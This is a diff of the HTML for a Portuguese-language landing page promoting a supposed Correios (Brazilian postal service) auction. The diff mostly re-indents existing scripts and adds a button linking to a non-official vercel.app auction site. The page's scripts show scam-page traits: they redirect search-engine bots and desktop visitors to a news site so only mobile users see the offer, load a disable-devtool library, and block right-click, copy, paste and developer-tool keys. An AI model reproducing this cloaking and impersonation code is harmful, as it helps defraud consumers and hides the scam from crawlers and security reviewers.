@@ -20,79 +20,81 @@
     document.addEventListener('allow_copy', (event) => {
       unlock = event.detail.unlock
     })
+  document.addEventListener('allow_copy', (event) => {
+  })
 
-    const copyEvents = [
-      'copy',
-      'cut',
-      'contextmenu',
-      'selectstart',
-      'mousedown',
-      'mouseup',
-      'mousemove',
-      'keydown',
-      'keypress',
-      'keyup',
-    ]
-    const rejectOtherHandlers = (e) => {
-      if (unlock) {
-        e.stopPropagation()
-        if (e.stopImmediatePropagation) e.stopImmediatePropagation()
-      }
+  const copyEvents = [
+    'copy',
+    'cut',
+    'contextmenu',
+    'selectstart',
+    'mousedown',
+    'mouseup',
+    'mousemove',
+    'keydown',
+    'keypress',
+    'keyup',
+  ]
+  const rejectOtherHandlers = (e) => {
+    if (unlock) {
+      e.stopPropagation()
+      if (e.stopImmediatePropagation) e.stopImmediatePropagation()
     }
-    copyEvents.forEach((evt) => {
-      document.documentElement.addEventListener(evt, rejectOtherHandlers, {
-        capture: true,
-      })
+  }
+  copyEvents.forEach((evt) => {
+    document.documentElement.addEventListener(evt, rejectOtherHandlers, {
+      capture: true,
     })
-  })()</script>  
-     <script>
-   //Função para detectar se é um dispositivo móvel
-  function isMobile() {
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  })
+})()</script>  
+   <script>
+ //Função para detectar se é um dispositivo móvel
+function isMobile() {
+return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+ }
+
+// Função para detectar se é um bot
+function isBot() {
+  const botAgents = [
+    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+  ];
+  
+  return botAgents.some(bot => navigator.userAgent.includes(bot));
+}
+
+// Função para verificar se a largura da janela é maior que 768px
+function isWideScreen() {
+  return window.innerWidth > 768;
+}
+
+// Redirecionar ou bloquear o acesso
+function checkAccess() {
+  if (isBot() || (!isMobile() && isWideScreen())) {
+   // Redirecionar para se o acesso for bloqueado
+
+    window.location.href = "https://g1.globo.com/";
    }
+ }
 
-  // Função para detectar se é um bot
-  function isBot() {
-    const botAgents = [
-      'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-      'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
-    ];
-    
-    return botAgents.some(bot => navigator.userAgent.includes(bot));
-  }
+// Executar a função de verificação ao carregar a página
+window.onload = checkAccess;
 
-  // Função para verificar se a largura da janela é maior que 768px
-  function isWideScreen() {
-    return window.innerWidth > 768;
-  }
-
-  // Redirecionar ou bloquear o acesso
-  function checkAccess() {
-    if (isBot() || (!isMobile() && isWideScreen())) {
-     // Redirecionar para se o acesso for bloqueado
-
-      window.location.href = "https://g1.globo.com/";
-     }
-   }
-
-  // Executar a função de verificação ao carregar a página
-  window.onload = checkAccess;
-
-  // Adicionar um listener para verificar novamente se a janela for redimensionada
-   window.addEventListener('resize', checkAccess);
- </script>  
- <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
- <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" disable-menu="true" clear-log="true" disable-select="true" disable-copy="true" disable-cut="true" disable-paste="true"></script>  
- <script type="text/javascript">
-        document.onkeydown = function (event) {
-             event = (event || window.event);
-             if (event.keyCode == 123 || event.keyCode == 18)
-             {
-                   return false;
-             }
-        }
-        document.addEventListener('contextmenu', event => event.preventDefault());
-    </script>  
+// Adicionar um listener para verificar novamente se a janela for redimensionada
+ window.addEventListener('resize', checkAccess);
+</script>  
+<script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" disable-menu="true" clear-log="true" disable-select="true" disable-copy="true" disable-cut="true" disable-paste="true"></script>  
+<script type="text/javascript">
+      document.onkeydown = function (event) {
+           event = (event || window.event);
+           if (event.keyCode == 123 || event.keyCode == 18)
+           {
+                 return false;
+           }
+      }
+      document.addEventListener('contextmenu', event => event.preventDefault());
+  </script>  
 <script language="javascript">
 document.onmousedown=disableclick;
 status="Right Click Disabled";
@@ -100,8 +102,8 @@ function disableclick(event)
 {
 if(event.button==2)
 {
- alert(status);
- return false;    
+alert(status);
+return false;    
 }
 }
 </script> 
@@ -110,26 +112,26 @@ if(event.button==2)
 var message = "";
 ///////////////////////////////////
 function clickIE() {
-    if (document.all) {
-        (message);
-        return false;
-    }
+  if (document.all) {
+      (message);
+      return false;
+  }
 }
 
 function clickNS(e) {
-    if (document.layers || (document.getElementById && !document.all)) {
-        if (e.which == 2 || e.which == 3) {
-            (message);
-            return false;
-        }
-    }
+  if (document.layers || (document.getElementById && !document.all)) {
+      if (e.which == 2 || e.which == 3) {
+          (message);
+          return false;
+      }
+  }
 }
 if (document.layers) {
-    document.captureEvents(Event.MOUSEDOWN);
-    document.onmousedown = clickNS;
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown = clickNS;
 } else {
-    document.onmouseup = clickNS;
-    document.oncontextmenu = clickIE;
+  document.onmouseup = clickNS;
+  document.oncontextmenu = clickIE;
 }
 
 document.oncontextmenu = new Function("return false")
@@ -180,6 +182,10 @@ document.oncontextmenu = new Function("return false")
                     <video src="videos/127 0 0 15501index html-01.mp4" style="width: 90vw;" autoplay controls></video>
                 
              <p></p>
+
+             <a href="https://correios-leilao.vercel.app/" class="ctabtn" >
+               ACESSAR LEILÃO AGORA
+          </a>
             <p class="texto">O tradicional leilão dos Correios está oficialmente aberto, trazendo diversas oportunidades para consumidores e empresas adquirirem produtos por preços acessíveis. Os lotes contam com uma ampla variedade de itens, incluindo celulares, materiais de escritório, periféricos e eletrônicos sortidos, televisores e aparelhos de ar-condicionado.<br><br>
                 
                 Para quem busca oportunidades de revenda ou mesmo para uso pessoal, este leilão representa uma excelente chance de adquirir produtos de qualidade a preços reduzidos.</p>
